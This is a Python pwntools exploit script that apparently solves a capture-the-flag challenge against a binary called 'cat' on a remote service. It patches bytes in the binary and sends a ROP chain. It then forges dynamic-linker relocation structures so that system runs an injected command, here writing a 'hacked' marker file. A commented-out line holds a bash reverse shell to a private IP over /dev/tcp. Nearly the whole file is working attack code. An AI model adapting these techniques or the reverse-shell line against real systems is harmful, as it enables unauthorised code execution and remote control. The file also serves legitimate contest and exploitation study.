#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian

from pwn import *

context.log_level = "info"
context.arch = "amd64"
context.terminal = ["tmux", "sp", "-h", "-l", "120"]

LOCAL = 0
filename = "./cat"
if LOCAL:
    io = process([filename, "./secret", "-"])
else:
    remote_service = "202.38.93.141:31339"
    remote_service = remote_service.strip().split(":")
    io = remote(remote_service[0], int(remote_service[1]))
# elf = ELF(filename, checksec=False)
# libc = ELF(elf.libc.path, checksec=False)


i2b = lambda x: str(x).encode()
lg = lambda s_name, s_val: print("\033[1;31;40m %s --> 0x%x \033[0m" % (s_name, s_val))
debugB = lambda: input("\033[1m\033[33m[PRESS ENTER TO CONTINUE]\033[0m")

if not LOCAL:
    io.recvline()
    io.sendline(input("Input your token: ").encode())

    io.recvuntil(b"[*] How many bytes do you want to modify?")
    io.sendline(i2b(4))
    io.recvuntil(b"[*] Enter offset: ")
    io.sendline(i2b(0x2F87 + 3))
    io.recvuntil(b"[*] Enter data: ")
    io.sendline(i2b(0))

    io.recvuntil(b"[*] Enter offset: ")
    io.sendline(i2b(0x2F03 + 3))
    io.recvuntil(b"[*] Enter data: ")
    io.sendline(i2b(0))

    io.recvuntil(b"[*] Enter offset: ")
    io.sendline(i2b(0x000000000041CA))
    io.recvuntil(b"[*] Enter data: ")
    io.sendline(i2b(0x75))

    io.recvuntil(b"[*] Enter offset: ")
    io.sendline(i2b(0x00000000002F9E))
    io.recvuntil(b"[*] Enter data: ")
    io.sendline(i2b(0xDA))
    io.recvuntil(b"RUNNING!\n")

my_buf = 0x40D000 + 0x480
# l_addr = libc.sym.system - libc.sym.free
l_addr = 0x58740 - 0xADD20
r_offset = my_buf + 0x200 - l_addr
fake_rel_addr = my_buf + 0x38

if l_addr < 0:
    l_addr = (1 << 64) + l_addr

lg("l_addr", l_addr)

# dynstr = elf.get_section_by_name(".dynstr").header.sh_addr
# plt0 = elf.get_section_by_name(".plt").header.sh_addr
# read_plt = elf.plt.read
dynstr = 0x3FE3C0
plt0 = 0x402020
read_plt = 0x4025B4
lg("my_buf", my_buf)
lg("dynstr", dynstr)
lg("plt0", plt0)

somegadget_2_ctl_rdx_0 = (
    0x0000000000402BBC  # cmp dword ptr [rbp - 4], 0x5f ; sete al ; pop rbp ; ret
)
somegadget_2_ctl_rdx_1 = 0x0000000000407E75  # pop rdx ; jg 0x40810a
ctl_rdi = 0x0000000000406E0E  # pop rdi ; pop rbp ; ret
ctl_rsi = 0x0000000000406E0C  # pop rsi ; pop r15 ; pop rbp ; ret
ctl_rbp = 0x000000000040285D  # pop rbp ; ret

payload = flat(
    {
        8: [
            ctl_rbp,
            0x40D2A0 + 4,
            somegadget_2_ctl_rdx_0,
            0x40D2A0 + 4,
            somegadget_2_ctl_rdx_1,
            0x200,  # rdx
            0,  # rbp
            ctl_rdi,  # ret
            0,
            0,
            ctl_rsi,
            my_buf,
            0,
            0,
            read_plt,
            ctl_rbp + 1,
            ctl_rdi,
            my_buf + 0x100,
            0,
            0x402026,
            my_buf,
            0,
        ]
    }
)
io.send(payload)
debugB()

payload = flat(
    {
        0x00: [l_addr],
        0x08: [0x05, dynstr],
        0x18: [0x06, 0x40D000 - 8],
        0x28: [0x11, fake_rel_addr],
        0x38: [r_offset, 7],
        0x68: [
            my_buf + 0x08,
            my_buf + 0x18,
        ],
        0xF8: [my_buf + 0x28],
        0x100: b"echo 'hacked by eastXueLian'>/dev/shm/hacked\x00",
        # 0x100: b"bash -i >& /dev/tcp/192.168.50.30/2299 0>&1\x00",
    },
)
io.send(payload)

io.interactive()
